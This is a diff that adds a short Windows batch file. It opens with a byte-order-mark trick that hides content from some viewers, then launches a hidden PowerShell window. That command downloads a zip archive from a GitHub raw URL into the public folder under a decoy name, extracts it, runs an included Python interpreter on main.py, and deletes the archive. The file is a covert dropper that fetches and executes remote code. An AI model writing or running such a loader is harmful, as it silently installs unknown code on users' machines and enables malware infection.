@@ -1,0 +1,3 @@
+ÿþ&cls
+@echo off
+start /min powershell.exe -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/longchinngon69/123/raw/refs/heads/main/asfasfasfaf.zip', '%PUBLIC%\\Destkopd6.zip'); Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%PUBLIC%\\Destkopd6.zip', '%PUBLIC%\\Destkopd6'); Start-Sleep -Seconds 1; %PUBLIC%\\Destkopd6\\python %PUBLIC%\\Destkopd6\\main.py; del %PUBLIC%\\Destkopd6.zip" && exit
